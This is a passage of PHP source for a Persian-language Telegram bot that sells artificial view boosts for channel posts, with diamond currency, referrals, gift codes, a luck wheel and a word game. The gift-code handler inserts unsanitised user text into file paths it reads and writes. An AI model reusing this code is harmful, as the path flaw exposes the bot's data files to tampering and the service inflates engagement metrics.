    file_put_contents("data/$from_id/golds.txt",$alma);
    bot('sendmessage',[
    'chat_id'=>$from_id,
    'text'=>"به پاس حمایت ما به شما 5 الماس اهدا شد✅
تعداد المس فعلی=>  $tedad 😋",
    ]);}
#==========
elseif($text == "اطلاعات بانکی🏦"){
	    	bot('sendmessage', [
  'chat_id' =>$chat_id,
  'text' =>"📔در حال بررسی فیش شما",
	  'parse_mode'=>'html',
	]);
	sleep(1);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵",
  ]);
  sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔴⚪️",
    ]);
    sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵🔴⚪️",
    ]);
   sleep(1);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵",
  ]);
  sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔴⚪️",
    ]);
    sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵🔴⚪️",
    ]);
	sleep(1);
	bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵",
  ]);
  sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔴⚪️",
    ]);
    sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"📔در حال بررسی فیش شما🔵🔴⚪️",
    ]);
  sleep(1);
  bot('editmessagetext',[
    'chat_id'=>$chat_id,
     'message_id'=>$message_id + 1,
    'text'=>"🗣 نام شما : $first
 تعداد حمایت از ما: $soof ❤️
🎗آیدی عددی شما : $chat_id
⬆️ انتقال از شما : $ent
⬇️ انتقال به شما : $entshoma
🆕 تعداد الماس های شما : $tedad",
  ]);
}
	#===================
    elseif($text == "برترین ها👑"){
        $bests = BestFind();
        $rank = rank($from_id);
        $str = "";
        foreach($bests as $value){
             $str .= "💥 رتبه {$value['rank']}:\n👤 ایدی عددی: <a href='tg://user?id={$value['id']}'>{$value['id']}</a>\n🔻 تعداد زیرمجموعه: {$value['referral']}\n\n";
        }
        $gsd = getStartDay(date('Y'),date('m'),date('d'));
        $gsd -= time();
        $h = floor($gsd/3600); $gsd %= 3600;
        $i = floor($gsd/60); $gsd %= 60;
     $endt = "$h:$i:$gsd";
      $refers = file_get_contents("referral/$from_id");
       $refers = number_format($refers);
    include 'getGift.php';
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"برترین ها👑: \n\n$str\n💣 $endt تا پایان مسابقه ی امروز 💣
⛓ پایان مسابقه ساعت 24:00 ⛓
جایزه برندگان :
نفر اول👍🏻 30 الماس
نفر دوم 🥀 20 الماس
نفر سوم 🔋 10 الماس
نفر چهارم⚙️ 5 الماس
📊تعداد زیر مجموعه های شما تا الان : $refers 🎉
🌟 رتبه فعلی شما : #$rank",
         'parse_mode'=>'html'
		]);
       }
    
	elseif($text == "زیرمجموعه گیری👥️"){

	   $caption = "معرفی میکنم اولین ربات ویوپنل دارای خدمات عالی و حرفه ای😝
میخوای یه چیزی باشه که به صورت کاملا رایگان بتونه هم به پست هات ویو بزنه😋
هم به کانالت ممبر و هم به پیج اینستاگرامت فالور و هم به شماره تلفنت شارژ🤩
*بلاخره انتظارها به پایان رسید*
برای اولین بار در تلگرام👇🏻
🤖: https://telegram.me/likeviewtell_bot?start=$chat_id √";
       bot('sendphoto',[
 'chat_id'=>$chat_id,
 'photo'=>new CURLFile('mem.jpg'),
 'caption'=>$caption
 ]);
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "کاربر عزیز، شما این بنر بالایی رو به دوستان ، کانال ، گروه های خود ارسال کنید ..

🔺هر یک کاربری که رو لینک شما بزند و وارد ربات شده و استارت را بزند شما $rand1 الی $rand2 عدد الماس دریافت میکنید 🙂",
'reply_to_message_id'=>$bot
        ]);
		
	}
	
	

elseif($text == "👀سفارش ویو👁"){

if($feek == "off" && !in_array($from_id,$ADMIN)){
bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"این قسمت به دستور مدیر برای لحظاتی غیر فعال شده است 💕",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
    exit();
}
if($tedad > 0){
file_put_contents("data/$from_id/com.txt","set");

	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🚀دوست عزیز جهت افزایش سین پستی را که میخواهید سین بخورد به همین ربات ارسال کنید😎🤟🏼


توجه این سفارش 1الماس از شما کم میکند📌📍",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
		}else{
	if(in_array($chat_id,$ADMIN)){
  bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"‼️تعداد الماس های شما کافی نیست، لطفا به بخش حساب کاربری مراجعه کرده و اقدام به افزایش الماس های خود کنید.",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_admin
	]);
	}else{
  bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"‼️تعداد الماس های شما کافی نیست، لطفا به بخش حساب کاربری مراجعه کرده و اقدام به افزایش الماس های خود کنید.",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
	}
	}
	}
	
		elseif($bot == "set"){
		
			file_put_contents("data/$from_id/com.txt","none");
			
		  if($update->message->forward_from_chat->type == "channel"){
		$newsof = $sof + 1;
		file_put_contents("data/sofs.txt",$newsof);
			  $newgold = $tedad - 1;
			
	file_put_contents("data/$from_id/golds.txt",$newgold);
sleep(1);
	bot('ForwardMessage', [
'chat_id' => "-1001255192301",#ایدی عددی کانال تبلیغات
'from_chat_id' => $chat_id,
'message_id' => $message_id
]);
bot('ForwardMessage', [
'chat_id' => "-1001255192301",#ایدی عددی کانال تبلیغات 2 
'from_chat_id' => $chat_id,
'message_id' => $message_id
]);
if(in_array($chat_id,$ADMIN)){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"✅ به پستی که فرستادی با موفقیت 100ویو اضافه شد!
⏱🎈ساعت :$time  💠تاریخ : $date
 💡توجه: برای هر پست یک بار میشه ویو زد پس اگه دوباره بفرستی فرقی به تعداد ویو هاش نمیکنه😅😘",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_admin
	]);
}else{
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"✅ به پستی که فرستادی با موفقیت 100ویو اضافه شد!
⏱🎈ساعت :$time  💠تاریخ : $date
 💡توجه: برای هر پست یک بار میشه ویو زد پس اگه دوباره بفرستی فرقی به تعداد ویو هاش نمیکنه😅😘",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
}
}else{
	if($text != "🔙برگشت🔙"){
file_put_contents("data/$from_id/com.txt","none");
if(in_array($chat_id,$ADMIN)){
        bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🙏توجه ؛ لطفا پست خود را از یک کانال
 فروارد کنید
✅پس دوباره تلاش کنید",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_admin
	]);
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🔻 به منوی اصلی بازگشتیم",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_admin
	]);
}else{
        bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🙏توجه ؛ لطفا پست خود را از یک کانال
 فروارد کنید
✅پس دوباره تلاش کنید",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🔻 به منوی اصلی بازگشتیم",
        'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_official_fa
	]);
}
	}
  }
  }
//اپن و نوشته شده توسط کانال : @cptsha8

elseif($text == "🥇کد هدیه🏆"){
 file_put_contents('data/'.$from_id."/com.txt","useCode");
 var_dump(bot('sendMessage',[
     'chat_id'=>$update->message->chat->id,
     'text'=>"کد هدیه را ارسال کنید 💰 :",
     'parse_mode'=>'MarkDown',
     'reply_markup'=>json_encode([
         'keyboard'=>[
             [
                 ['text'=>"🔙برگشت🔙"]
             ]
         ],
         'resize_keyboard'=>true
     ])
 ]));
}

elseif ($bot == "useCode") {
file_put_contents('data/'.$from_id."/com.txt","none");
 if (file_exists("admin/code/$text.txt")) {
  $price = file_get_contents("admin/code/$text.txt");
  if($price == 'true'){
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "کدی که فرستادی استفاده شده😕",
            'parse_mode' => "MarkDown",
        ]);
  }else{
$coin = file_get_contents('data/'.$from_id."/golds.txt");
$coinsprice = file_get_contents("admin/coins/$text.txt");
$getcoins = $coin + $coinsprice;
file_put_contents("data/$chat_id/golds.txt",$getcoins);
file_put_contents("admin/code/$text.txt","true");
if(in_array($chat_id,$ADMIN)){
  var_dump(bot('sendMessage',[
      'chat_id'=>$update->message->chat->id,
      'text'=>"به تعداد $coinsprice الماس به شما اضافه شد.",
      'parse_mode'=>'MarkDown',
      'reply_markup'=>$button_official_admin
  ]));
}else{
  var_dump(bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>"به تعداد $coinsprice الماس به شما اضافه شد.",
      'parse_mode'=>'MarkDown',
      'reply_markup'=>$button_official_fa
  ]));
}
	bot('sendmessage',[
	'chat_id'=>$channel,
	'text'=>"➖➖➖➖➖➖➖➖➖
کد با موفقیت استفاده شد✅
⏰ ساعت ↙️
⏰$time
📆تاریخ↙️
📆$date
🔶🔷🔶🔷🔶🔷🔶🔷🔶

👤 توسط 
👤Name: 
$first
💠
🆔Username: 
@$username
💠

🌐UserID: 
$from_id
💠
💰الماس های دریافت شده↙️
🔆$coinsprice
➖➖➖➖➖➖➖➖➖",
	]);
  }
 }else{
	 file_put_contents('data/'.$from_id."/com.txt","none");
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"کدی که فرستادی اصلا وجود نداره😂",
	]);
 }
}

if($text == "❓راهنما❗️"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"⁉️ این ربات کارش چیه؟ و به چه دردی میخوره؟
▪️این ربات واسه افرادی که کانال دارند و بازدید پست های کانالشان کم است و میخواهند یه چیزی باشه که با اون پست های کانالشون رو رایگان سین بزنن! به دردشون میخوره..
همچنین افرادی که در چالش یا مسابقه ویو زدن بنر خود شرکت کردند میتوانند با این ربات ویو آن را به مقدار محدودی افزایش بدهند..

❓چجوری با ویوپنل کار کنم؟
🔸خب خیلی راحته! اول روی دکمه سفارش ویو کلیک کنید..
بعد هم پُست موردنظر خود را از کانال خود یا دیگران به این ربات فروارد کنید..
تمام! 😇

💎 حالا الماس به چه دردی میخوره؟
🔹خب با الماس هاتون میتونید سفارش ویو بدید دیگه وگرنه اگه تموم بشن باید دوباره الماس بگیرید.. چجوری؟ دوتا راه داره یکیش اینکه میتونید زیرمجموعه گیری کنید یکی هم میتونید الماس خریداری کنید..

🔴 اتو ویو چیست؟
♦️خب اگر بازم خسته میشید و اگر پست های کانالتان زیاد میباشد و نمیتوانید به آنها یکی یکی سفارش ویو دهید.. ما چاره ای نیز برای این مشکل یافتیم😃
خب اتو ویو در اینجا به کمک شما میاد.. چجوری کار میکنه؟ خیلی راحت باید اول این بخش رو از طریق دکمه مربوطه فعال کنید و بعد ربات ویوپنل رو در کانال خودتون ادمین کنید.. بعد از اون هر پستی که توی کانالتون بزارید یا بقیه بزارن..! تو یک ثانیه به صورت کاملا خودکار ویو پستتون افزایش پیدا میکنه😆
چقدر ویو به پست هایی که تو کانالتون گذاشته میشه اضافه میکنیم؟
خب به تعداد همون قدری که تو بخش سفارش ویو به پست هاتون ویو اضافه میشه در اینجا هم همونقدر..😍

🔻ارتباط با ما🔻

👨‍💻 : @cptsha8  
🗝: @SupXlin_bot",'parse_mode'=>'html',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
	}
	#=====================================
	 elseif($text == "گردونه شانس🎡"){
       $d = file_get_contents("data/$from_id/date2.txt");
       if($d != date('Ymd')){
       file_put_contents("data/$from_id/com.txt","GarDoneh");
       bot('sendMessage', [
   'chat_id' => $chat_id,
    'text'=>"😀 امروز میتونی یک بار شانست رو امتحان کنی و چند تا الماس بدی و سود یا ضرر کنی.

💎 اگه ۱۰ تا الماس بدی من بهت 0 تا 15 الماس میدم
💎 اگه ۵۰ الماس بدی من بهت 45 تا 65  الماس میدم
💎 اگه ۱۰۰ الماس بدی من بهت ۷۵ تا 120 الماس میدم

😊 الان میخای چند تا الماس بدی و شانست رو امتحان کنی؟",
  'reply_markup'=> json_encode(['keyboard'=>[
     [['text'=>"10"],['text'=>"50"],['text'=>"100"]],
   [['text'=>"🔙برگشت🔙"]],
      ], 'resize_keyboard'=>true])
       ]);
     } else {
      bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"شانس امروز رو امتحان کردی فردا بیا...",'parse_mode'=>'MarkDown',
    ]);
    }
   }
   elseif($bot == 'GarDoneh'){
    if(($text == 10 || $text == 50 || $text == 100)){
          if($coin >= $text){
          if($text == 10){
  $r = rand(5,15);
          }
if($text == 100){
  $r = rand(75,120);
          }
if($text == 50){
  $r = rand(40,65);
          }
     $xu = $r-$text;
     $coin += $xu;
     file_put_contents("data/$from_id/golds.txt", $coin);
     file_put_contents("data/$from_id/date2.txt", date('Ymd'));
     file_put_contents("data/$from_id/com.txt", "none");
     bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"مقدار $r الماس گرفتی.",'parse_mode'=>'MarkDown',
    'reply_markup'=>$button_official_fa
    ]);
    }
    else {
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"الماس نداری",'parse_mode'=>'MarkDown',
    ]);
   }
    } else {
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"یک گزینه انتخاب کن:",'parse_mode'=>'MarkDown',
    ]);
    }
    }
	#=======================================
	elseif($text == "بازی[🎮]"){
$tryyegame = file_get_contents("data/$from_id/truegame.txt");
	if($tryyegame != "true"){
bot('sendmessage', [
'chat_id' => $from_id,
'text' =>"خب به منوی بازی  خوش اومدی!

در این بازی شما 15 مرحله را پشت سر خواهید گذاشت و بعد اتمام بازی 15 امتیاز به حساب شما واریز میشود!

برای شروع روی دکمه شروع بزنید!",
'reply_markup'=>json_encode(['keyboard'=>[
     [['text'=>"شروع بازی[🎮]"]],
   [['text'=>"🔙برگشت🔙"]],
      ], 'resize_keyboard'=>true])
      ]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"شما قبلا یک سری بازی کردی!",
'reply_markup'=>$back]);
}}
elseif($text == "شروع بازی[🎮]"){
    if($tryyegame != "true"){
save("data/$chat_id/com.txt","game1");
bot('sendmessage', [
'chat_id' => $from_id,
'text' =>"کلمه بهم ریخته را درست و ارسال کید!

س ک و س ه س ا ی",
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"شما قبلا یک سری بازی کردی!",
'reply_markup'=>$back]);
}}
//
elseif($command == "game1"){
if($text == "سوسک سیاه"){
save("data/$chat_id/com.txt","game2");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 2

ه س ا ر ت-ی ر ی د ا ی",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game2"){
if($text == "ستاره-دریایی"){
save("data/$chat_id/com.txt","game3");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 3

ت ه ف-س م آ ا ن",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game3"){
if($text == "هفت-آسمان"){
save("data/$chat_id/com.txt","game4");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 4

ت خ ش و ر-م ق ر ه و",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game4"){
if($text == "خورشت-قورمه"){
save("data/$chat_id/com.txt","game5");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 5

ش ک ک- م ب ن ا ج د ا",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game5"){
if($text == "کشک-بادمجان"){
save("data/$chat_id/com.txt","game6");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 6

ت ت و- گ ی ن ف ر",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game6"){
if($text == "توت-فرنگی"){
save("data/$chat_id/com.txt","game7");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 7

ه م و ر ج ی-س ا م ل ی",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game7"){
if($text == "جمهوری-اسلامی"){
save("data/$chat_id/com.txt","game8");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 8

م ا ر ی و ه",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game8"){
if($text == "ارومیه"){
save("data/$chat_id/com.txt","game9");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 9

د س ا ک ن ر ت",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game9"){
if($text == "کردستان"){
save("data/$chat_id/com.txt","game10");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 10

ز ر ل ب ا",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game10"){
if($text == "البرز"){
save("data/$chat_id/com.txt","game11");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 11

ن د م و ا د",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game11"){
if($text == "دماوند"){
save("data/$chat_id/com.txt","game12");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 12

ک ر م ا ی آ-م ا ل ش ی",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
elseif($command == "game12"){
if($text == "آمریکا-شمالی"){
save("data/$chat_id/com.txt","game13");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 13

ه ن ا و ه د و ن",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game13"){
if($text == "هندوانه"){
save("data/$chat_id/com.txt","game14");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 14

د م ر- ک ع  ب ن ت و ی",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game14"){
if($text == "مرد-عنکبوتی"){
save("data/$chat_id/com.txt","game15");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!
خب رفتیم سوال 15

ل گ-ل ژ ا ه",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
//
elseif($command == "game15"){
if($text == "گل-ژاله"){
save("data/$chat_id/com.txt","noun");
save("data/$chat_id/truegame.txt","true");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"درست بود!

15 امتیاز به حساب شما جهت قدر دانی به پایان رساندن مسابقه اهدا شد!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$button_menu]);
$gold = file_get_contents("data/$chat_id/golds.txt");
$newgold = $tedad + 15;
save("data/$chat_id/golds.txt","$newgold");
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"اشتباه بود دوباره سعی کن!",
'reply_to_message_id'=>$message_id,
'parse_mode' => "html",
'reply_markup'=>$back]);
}}
#----دکمه-----


	#=======
	
	
	//اپن و نوشته شده توسط کانال : @cptsha8
	if($text == "🔰اتوویو(ویو خودکار)"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"ببین دوست عزیز وقتی این بخش رو فعال کنی دیگه خیالت راحت میشه چون پستات خودکار ویو میخورن👌🏻

حتما میگی چجوری❔
خیلی راحت فقط  باید ربات رو ادمین کانالت کنی و این بخش رو از ادمین ها بخری🏧

قیمت این بخش بستگی به تعداد روزی داره که میخواین اتو کنین🕹

قیمت فعالسازی را میتوانید از ادمین ها بپرسید و فعال کنین

آیدی ادمین ها جهت خرید👇👇
@cptsha8  
@cptsha8  
🗝: @SupXlin_bot
در ضمن اگه ریپورتی میتونی بری و از پشتیبانی در خواست خرید بدی☎️",'parse_mode'=>'html',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
	}
	#+==========================
	if($text == "💵💳خرید سورس💳💵"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"ببین دوست عزیز
ما وقت زیادی رو سورس گزاشتیم⚙🔩
ولی

به کم ترین قیمت میفروشیم🧘‍♂

قیمت فقط و فقط
30 هزار تومان🎿

خرید:
@cptsha8
@SupXlin_bot ",'parse_mode'=>'html',
        	'reply_markup'=>json_encode([
	'resize_keyboard'=>true,
	'keyboard'=>[
	[['text'=>"🔙برگشت🔙"]],
	[['text'=>""]]
	]
	])
	]);
	}
	#+===========================
	elseif($text == "مشخصات کاربری📓"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📁نام شما: $first
🆔ایدی عددی شما :$chat_id
💎تعداد الماس:  $tedad
	تعداد حمایت از ما: $soof ❤️
تاریخ:   $date 🔹  ساعت:  $time 🔸
برای کسب الماس های بیشتر روی دکمه (دریافت لینک افزایش الماس) بزنید😃",'parse_mode'=>'html',
        	'reply_markup'=>$button_official_fa
	]);
	}
	#===============+++++++++++++
	

	
	
	
	
	
	elseif($text == "💳 خرید الماس🏧"){
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"💡تعرفه خرید الماس در ربات ویوپنل :

📣 تعداد هر `100` عدد الماس، فقط `10,000` تومان .
∞
🎗بسته های تخفیف دار :

💎 تعداد `250` عدد الماس، فقط `23,000` تومان .
💎 تعداد `1000` عدد الماس، فقط `80,000` تومان .

°°°°°°°°°°°°°°°
🌹کاربرگرامی، جهت خرید الماس با پشتیبانی در ارتباط باشید🔻

👨‍💻: @cptsha8  
🤖 : @cptsha8  
🗝: @SupXlin_bot",'parse_mode'=>'html',
        	'reply_markup'=>$button_official_fa
	]);
	}
	
    

#--- PANEL ADMIN ---

#----دکمه-----

#-----------
elseif($text == "👤مدیریت" && in_array($chat_id,$ADMIN)){

file_put_contents("data/$from_id/com.txt","none");

        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ادمین عزیز به پنل مدیریتی ربات خوش آمدید😊",
               'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_manage
	]);
	}
	//اپن و نوشته شده توسط کانال : @cptsha8
		elseif($text == "🎁 الماس همگانی" && in_array($chat_id,$ADMIN)){
file_put_contents("data/$from_id/com.txt","coin to all");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"🔢 لطفا تعداد الماس را بصورت عدد وارد کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
      ],'resize_keyboard'=>true])
	]);
}

elseif($text == "💤خاموش کردن" && in_array($chat_id,$ADMIN)){
if($on != "off"){
file_put_contents("on.txt","off");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"🎭 ربات خاموش شد",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ربات از قبل خاموش بود...",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}
}

elseif($text == "❇️روشن کردن" && in_array($chat_id,$ADMIN)){
if($on != "on"){
file_put_contents("on.txt","on");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"🙃 ربات روشن شد",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"ربات از قبل روشن بود...",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
	]);
}
}

elseif($bot == "coin to all"){
if(preg_match('/^([0-9])/',$text)){
file_put_contents("data/$from_id/wait.txt",$text);
file_put_contents("data/$from_id/com.txt","coin to all 2");
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"⁉️ آیا ارسال $text الماس به تمام کاربران ربات را تایید میکنید ؟

بله یا خیر؟",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}else{
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"⚠️ ورودی نامعتبر است !
👈🏻 لطفا فقط عدد ارسال کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'html',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'👤مدیریت']],
      ],'resize_keyboard'=>true])
	]);
}
}
elseif($bot == "coin to all 2"){
if($text == "خیر"){
unlink("data/$from_id/wait.txt");
file_put_contents("data/$from_id/com.txt",'none');
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت لغو شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'MarkDown',
        	'reply_markup'=>$button_manage
	]);
}
elseif($text == "بله"){
